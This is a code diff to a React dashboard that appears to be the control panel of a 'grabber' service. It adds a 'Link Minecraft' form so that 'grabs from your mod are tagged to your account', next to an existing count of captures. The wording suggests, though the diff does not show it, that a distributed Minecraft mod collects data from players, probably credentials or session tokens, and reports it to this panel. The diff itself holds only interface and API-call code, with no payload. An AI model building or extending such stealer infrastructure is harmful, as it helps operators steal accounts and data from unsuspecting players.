@@ -27,6 +27,9 @@ function NavItem({ icon, label, active, onClick }) {
 
 function Dashboard({ userEmail }) {
   const [grabCount, setGrabCount] = useState(0);
+  const [mcUsername, setMcUsername] = useState('');
+  const [mcSaved, setMcSaved] = useState(false);
+  const [mcLoading, setMcLoading] = useState(true);
 
   useEffect(() => {
     if (!userEmail) return;
@@ -36,7 +39,21 @@ function Dashboard({ userEmail }) {
       .then(r => r.json())
       .then(d => setGrabCount(d.grabs?.length || 0))
       .catch(() => {});
+    fetch(`/api/user/minecraft?email=${encodeURIComponent(userEmail)}`)
+      .then(r => r.json())
+      .then(d => { if (d.username) { setMcUsername(d.username); setMcSaved(true); } setMcLoading(false); })
+      .catch(() => setMcLoading(false));
   }, [userEmail]);
+
+  const handleSaveMc = async () => {
+    if (!mcUsername.trim()) return;
+    const res = await fetch('/api/user/minecraft', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: userEmail, minecraft_username: mcUsername.trim() }),
+    });
+    if (res.ok) setMcSaved(true);
+  };
 
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
@@ -65,6 +82,32 @@ function Dashboard({ userEmail }) {
           <div style={{ height: 200, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
             <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
             <span style={{ fontSize: 13 }}>{grabCount === 0 ? 'No captures yet' : 'Check Grabs tab'}</span>
+          </div>
+        </div>
+        <div style={{ flex: 1 }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
+            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Link Minecraft</span>
+          </div>
+          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 16 }}>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 10 }}>
+              Enter your Minecraft username so grabs from your mod are tagged to your account.
+            </div>
+            {mcSaved ? (
+              <div style={{ fontSize: 13, color: colors.green, display: 'flex', alignItems: 'center', gap: 6 }}>
+                ✓ Linked to <strong>{mcUsername}</strong>
+              </div>
+            ) : (
+              <div style={{ display: 'flex', gap: 8 }}>
+                <input
+                  value={mcUsername}
+                  onChange={e => setMcUsername(e.target.value)}
+                  onKeyDown={e => e.key === 'Enter' && handleSaveMc()}
+                  placeholder="Minecraft username"
+                  style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 13, outline: 'none' }}
+                />
+                <button onClick={handleSaveMc} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Link</button>
+              </div>
+            )}
           </div>
         </div>
       </div>
